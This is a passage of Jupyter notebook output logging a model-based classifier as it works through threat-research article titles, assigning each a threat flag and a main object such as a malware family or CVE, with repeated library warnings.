            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "🔍 Processing 427 articles...\n",
            "Processing 1/427: FortiGuard Labs Threat Research...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RondoDox\n",
            "Processing 2/427: NailaoLocker Ransomware’s “Cheese”...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: NailaoLocker\n",
            "Processing 3/427: Improving Cloud Intrusion Detection and Triage wit...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 4/427: Old Miner, New Tricks...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: H2Miner\n",
            "Processing 5/427: How FortiSandbox 5.0 Detects Dark 101 Ransomware D...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Dark 101\n",
            "Processing 6/427: Catching Smarter Mice with Even Smarter Cats...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Tool: IDA Pro\n",
            "Processing 7/427: NordDragonScan: Quiet Data-Harvester on Windows...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "You seem to be using the pipelines sequentially on GPU. In order to maximize efficiency please use a dataset\n",
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: NordDragonScan\n",
            "Processing 8/427: RondoDox Unveiled: Breaking Down a New Botnet Thre...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RondoDox\n",
            "Processing 9/427: DCRAT Impersonating the Colombian Government...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: DCRAT\n",
            "Processing 10/427: Dissecting a Malicious Havoc Sample...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Havoc\n",
            "  Processed 10/427 articles\n",
            "Processing 11/427: Threat Group Targets Companies in Taiwan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: HoldingHands RAT\n",
            "Processing 12/427: RolandSkimmer: Silent Credit Card Thief Uncovered...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RolandSkimmer\n",
            "Processing 13/427: How a Malicious Excel File (CVE-2017-0199) Deliver...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: FormBook\n",
            "Processing 14/427: Deep Dive into a Dumped Malware without a PE Heade...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: malware\n",
            "Processing 15/427: Infostealer Malware FormBook Spread via Phishing C...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: FormBook\n",
            "Processing 16/427: Ransomware Roundup – VanHelsing...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: VanHelsing\n",
            "Processing 17/427: Horabot Unleashed: A Stealthy Phishing Threat...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Horabot\n",
            "Processing 18/427: Multilayered Email Attack: How a PDF Invoice and G...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RATty\n",
            "Processing 19/427: FortiGuard Incident Response Team Detects Intrusio...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Havoc\n",
            "Processing 20/427: Key Takeaways from the 2025 Global Threat Landscap...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "  Processed 20/427 articles\n",
            "Processing 21/427: IngressNightmare: Understanding CVE‑2025‑1974 in K...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2025-1974\n",
            "Processing 22/427: Infostealer Malware FormBook Spread via Phishing C...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Formbook\n",
            "Processing 23/427: New Rust Botnet \"RustoBot\" is Routed via Routers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2022-26210\n",
            "Processing 24/427: Malicious NPM Packages Targeting PayPal Users...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: oauth2-paypal\n",
            "Processing 25/427: Real-Time Anti-Phishing: Essential Defense Against...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 26/427: Fortinet Identifies Malicious Packages in the Wild...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Command overwrite\n",
            "Processing 27/427: Havoc: SharePoint with Microsoft Graph API turns i...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Havoc Demon Agent\n",
            "Processing 28/427: Winos 4.0 Spreads via Impersonation of Official Em...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Winos4.0\n",
            "Processing 29/427: FortiSandbox 5.0 Detects Evolving Snake Keylogger ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Snake Keylogger\n",
            "Processing 30/427: Ransomware Roundup – Lynx...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Lynx\n",
            "  Processed 30/427 articles\n",
            "Processing 31/427: Analyzing ELF/Sshdinjector. A!tr with a Human and ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ELF/Sshdinjector.A!tris\n",
            "Processing 32/427: Coyote Banking Trojan: A Stealthy Attack via LNK F...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Coyote Banking Trojan\n",
            "Processing 33/427: Deep Dive Into a Linux Rootkit Malware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: sysinitd.ko\n",
            "Processing 34/427: Phish-free PayPal Phishing...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 35/427: Catching \"EC2 Grouper\"- no indicators required!...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: EC2 Grouper\n",
            "Processing 36/427: Botnets Continue to Target Aging D-Link Vulnerabil...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2024-33112\n",
            "Processing 37/427: Analyzing Malicious Intent in Python Code: A Case ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Zebo-0.1.0\n",
            "Processing 38/427: Fortinet Contributes to Major Cybercrime Operation...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Lazarus Group\n",
            "Processing 39/427: SmokeLoader Attack Targets Companies in Taiwan...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: SmokeLoader\n",
            "Processing 40/427: Ransomware Roundup - Interlock...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Interlock\n",
            "  Processed 40/427 articles\n",
            "Processing 41/427: Advanced Cyberthreats Targeting Holiday Shoppers...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Technique: Remote code execution (RCE)\n",
            "Processing 42/427: Threat Predictions for 2025: Get Ready for Bigger,...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 43/427: New Campaign Uses Remcos RAT to Exploit Victims...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Remcos\n",
            "Processing 44/427: Threat Campaign Spreads Winos4.0 Through Game Appl...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Winos4.0\n",
            "Processing 45/427: Burning Zero Days: Suspected Nation-State Adversar...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2024-8190\n",
            "Processing 46/427: Threat Actors Exploit GeoServer Vulnerability CVE-...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2024-36401\n",
            "Processing 47/427: Emansrepo Stealer: Multi-Vector Attack Chains...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Emansrepo\n",
            "Processing 48/427: Ransomware Roundup - Underground...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Underground\n",
            "Processing 49/427: Deep Analysis of Snake Keylogger’s New Variant...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Snake Keylogger\n",
            "Processing 50/427: A Deep Dive into a New ValleyRAT Campaign Targetin...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: ValleyRAT\n",
            "  Processed 50/427 articles\n",
            "Processing 51/427: Preparation Is Not Optional: 10 Incident Response ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 52/427: PureHVNC Deployed via Python Multi-stage Loader...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: PureHVNC\n",
            "Processing 53/427: Malicious Packages Hidden in PyPI...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: zlibxjson\n",
            "Processing 54/427: Phishing Campaign Targeting Mobile Users in India ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Actor: Smishing Triad\n",
            "Processing 55/427: Dark Web Shows Cybercriminals Ready for Olympics. ...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 56/427: MerkSpy: Exploiting CVE-2021-40444 to Infiltrate S...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: MerkSpy\n",
            "Processing 57/427: The Growing Threat of Malware Concealed Behind Clo...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2016-20016\n",
            "Processing 58/427: Fickle Stealer Distributed via Multiple Attack Cha...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Fickle Stealer\n",
            "Processing 59/427: Ransomware Roundup – Shinra and Limpopo Ransomware...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Shinra\n",
            "Processing 60/427: New Agent Tesla Campaign Targeting Spanish-Speakin...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Agent Tesla\n",
            "  Processed 60/427 articles\n",
            "Processing 61/427: Menace Unleashed: Excel File Deploys Cobalt Strike...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Cobalt Strike\n",
            "Processing 62/427: zEus Stealer Distributed via Crafted Minecraft Sou...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: zEus\n",
            "Processing 63/427: Key Findings from the 2H 2023 FortiGuard Labs Thre...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: False\tMain object: \n",
            "Processing 64/427: New “Goldoon” Botnet Targeting D-Link Devices...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2015-2051\n",
            "Processing 65/427: Ransomware Roundup - KageNoHitobito and DoNex...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: KageNoHitobito\n",
            "Processing 66/427: Unraveling Cyber Threats: Insights from Code Analy...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: discordpy_bypass-1.7\n",
            "Processing 67/427: Botnets Continue Exploiting CVE-2023-1389 for Wide...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Vulnerability: CVE-2023-1389\n",
            "Processing 68/427: ScrubCrypt Deploys VenomRAT with an Arsenal of Plu...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: VenomRAT\n",
            "Processing 69/427: Byakugan – The Malware Behind a Phishing Attack...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: Byakugan\n",
            "Processing 70/427: Ransomware Roundup – RA World...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Is threat: True\tMain object: Malware: RA World\n",
            "  Processed 70/427 articles\n",
            "Processing 71/427: VCURMS: A Simple and Functional Weapon...\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stderr",
          "text": [
            "The following generation flags are not valid and may be ignored: ['temperature', 'top_p', 'top_k']. Set `TRANSFORMERS_VERBOSITY=info` for more details.\n"
          ]
        },
        {
          "output_type": "stream",
          "name": "stdout",
